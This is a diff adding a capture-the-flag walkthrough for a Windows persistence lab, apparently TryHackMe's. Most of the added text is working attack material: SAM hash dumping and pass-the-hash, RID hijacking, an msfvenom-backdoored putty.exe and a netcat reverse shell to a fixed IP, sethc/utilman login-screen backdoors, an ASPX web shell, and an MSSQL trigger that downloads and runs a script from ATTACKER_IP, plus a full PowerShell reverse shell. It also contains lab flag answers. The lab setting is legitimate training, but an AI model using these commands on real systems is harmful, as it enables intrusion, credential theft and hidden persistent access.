@@ -214,9 +214,111 @@ If you did everything correctly, you should be logged in to the Administrator's 
 
 * Insert flag1 here
 
+    `THM{FLAG_BACKED_UP!}`
+
+    * Assign group memperships as Backup Operators and RDP user
+
+        ![task2-assign-group](./images/task2-assign-group.png)
+
+    * Login user 
+
+        ```
+        evil-winrm -i $IP -u thmuser1 -p Password321
+        ```
+
+        ![task2-login](./images/task2-login.png)
+
+    * Disable LocalAccountTokenFilterPolicy from administrator user
+
+        ```
+        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+        ```
+
+        ![task2-reg-add](./images/task2-reg-add.png)
+
+    * Make backup of SAM and SYSTEM 
+
+        ```
+        reg save hklm\system system.bak
+        reg save hklm\sam sam.bak
+        download system.bak
+        download sam.bak
+        ```
+
+        ![task2-download](./images/task2-download.png)
+
+    * Dump the password hashes for all users using `secretsdump.py`
+
+        ```
+        python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+        ```
+
+        ![task2-dumped](./images/task2-dumped.png)
+
+    * Pass-the-Hash to connect to the victim machine with Administrator privileges
+
+        ```
+        evil-winrm -i $IP -u Administrator -H f3118544a831e728781d780cfdb9c1fa
+        ```
+        
+        ![task2-flag1-ans](./images/task2-flag1-ans.png)
+
 * Insert flag2 here
 
+    `THM{IM_JUST_A_NORMAL_USER}`
+
+    * Export current configuration of Security Descriptors
+
+        ```
+        secedit /export /cfg config.inf
+        ```
+
+        ![task2-secedit](./images/task2-secedit.png)
+
+    * Edit/add thmuser2 to **SeBackupPrivilege** and **SeRestorePrivilege** 
+
+        ![task2-config](./images/task2-config.png)
+
+    * Convert the .inf file into a .sdb and load the configuration back into the system
+
+        ```
+        secedit /import /cfg config.inf /db config.sdb
+
+        secedit /configure /db config.sdb /cfg config.inf
+        ```
+
+        ![task2-convert](./images/task2-convert.png)
+
+    * Add thmuser2 to WinRM's security descriptor via Powershell (run as Admin)
+
+        ```
+        Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+        ```
+
+        ![task2-SecurityDescriptor](./images/task2-SecurityDescriptor.png)
+
+    * Login thmuser2 via WinRM and Get the flag
+
+        ![task2-flag2-ans](./images/task2-flag2-ans.png)
+
 * Insert flag3 here
+
+    `THM{TRUST_ME_IM_AN_ADMIN}`
+
+    * Open SAM registry using PsExec
+
+        ```
+        PsExec64.exe -i -s regedit
+        ```
+    * Edit registry thmuser3 RID to administrator RID
+
+        ![task2-regedit](./images/task2-regedit.png)
+
+        ![task2-value](./images/task2-value.png)
+
+    * Login thmuser3 via RDP and Get the flag
+
+        ![task2-flag3-ans](./images/task2-flag3-ans.png)
 
 ## Task 3 - Backdooring Files
 
@@ -300,7 +402,53 @@ Finally, create a listener for your reverse shell and try to open any .txt file 
 
 ### Answer the questions below
 
+* Modify Executable Files
+
+    * Download file executeable with high chances that the user might use it frequently
+
+        ![task3-download](./images/task3-download.png)
+    
+    * Modify the file
+
+        ```
+        msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.9.251.6 lport=4444 -b "\x00" -f exe -o puttyX.exe
+        ```
+
+    * Transfer file to target machine and modify the taget shortcut
+
+        ![task3-puttyX](./images/task3-puttyX)
+
+    * Set listener
+
+        ![task3-listener3](./images/task3-listener3.png)
+
+    * Run the shortcut file and get the shell
+
+        ![task3-putty-shell](./images/task3-putty-shell.png)
+
 * Insert flag5 here
+
+    `THM{NO_SHORTCUTS_IN_LIFE}`
+
+    * Create file script `backdoor.ps1` and save to `C:\Windows\System32\`
+
+        ```
+        Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.9.251.6 5555"
+
+        C:\Windows\System32\calc.exe
+        ```
+
+    * Modify the shortcut to point to our script
+
+        ![task3-calc-backdoor](./images/task3-calc-backdoor.png)
+
+    * Set listner on our machine
+
+        ![task3-listener2](./images/task3-listener2.png)
+
+    * Double-click the shortcut and get the flag
+
+        ![task3-shell]
 
 * Insert flag6 here
 
@@ -583,8 +731,194 @@ After doing this, sign out of your current session and log in again, and you sho
 
 ## Task 7 - Backdooring the Login Screen / RDP
 
+If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.
+
+We will look at two methods that rely on accessibility features to this end.
+
+### Sticky Keys
+
+When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.
+
+To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
+
+![task7-sticky-key](./images/task7-sticky-key.png)
+
+After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
+
+A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
+
+To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
+
+```
+takeown /f c:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+```
+
+![task7-cmd](./images/task7-cmd.png)
+
+After doing so, lock your session from the start menu:
+
+![task7-menu](./images/task7-menu.png)
+
+You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
+
+![task7-flag](./images/task7-flag.png)
+
+### Utilman
+
+Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
+
+![task7-utilman](./images/task7-utilman.png)
+
+When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.
+
+To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
+
+```
+takeown /f c:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+```
+
+![task7-cmd2](./images/task7-cmd2.png)
+
+To trigger our terminal, we will lock our screen from the start button:
+
+![task7-lock](./images/task7-lock.png)
+
+And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges:
+
+![task7-utilman-backdoor](./images/task7-utilman-backdoor.png)
+
+![task7-flag2](./images/task7-flag2.png)
+
+### Answer the questions below
+
+* Insert flag14 here
+
+* Insert flag15 here
 
 ## Task 8 - Persisting Through Existing Services
 
+If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!
+
+### Using Web Shells
+
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).
+
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:
+
+```
+move shell.aspx C:\inetpub\wwwroot\
+```
+
+**Note**: Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.
+
+We can then run commands from the web server by pointing to the following URL:
+
+`http://MACHINE_IP/shell.aspx`
+
+![task8-flag](./images/task8-flag.png)
+
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+
+### Using MSSQL as a Backdoor
+
+There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.
+
+Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
+
+To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
+
+Once logged in, click on the **New Query** button to open the query editor:
+
+![task8-sql-query](./images/task8-sql-query.png)
+
+Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:
+
+```
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+After all of this, we finally configure a trigger. We start by changing to the HRDB database:
+
+```
+USE HRDB
+```
+
+Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:
+
+```
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+
+Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+
+We will need to open two terminals to handle the connections involved in this exploit:
+
+* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
+* The second connection will be a reverse shell on port 4454 back to our attacker machine.
+
+![task8-shell](./images/task8-shell.png)
+
+With all that ready, let's navigate to http://MACHINE_IP/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
+
+![task8-flag2](./images/task8-flag2.png)
+
+### Answer the questions below
+
+* Insert flag16 here
+
+* Insert flag17 here
 
 ## Task 9 - Conclusion
+
+In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.
+
+While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:
+
+* [Hexacorn - Windows Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
+* [PayloadsAllTheThings - Windows Persistence ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
+* [Oddvar Moe - Windows Persistence Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
+* [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)
+
+### Answer the questions below
+
+* Click and continue learning!
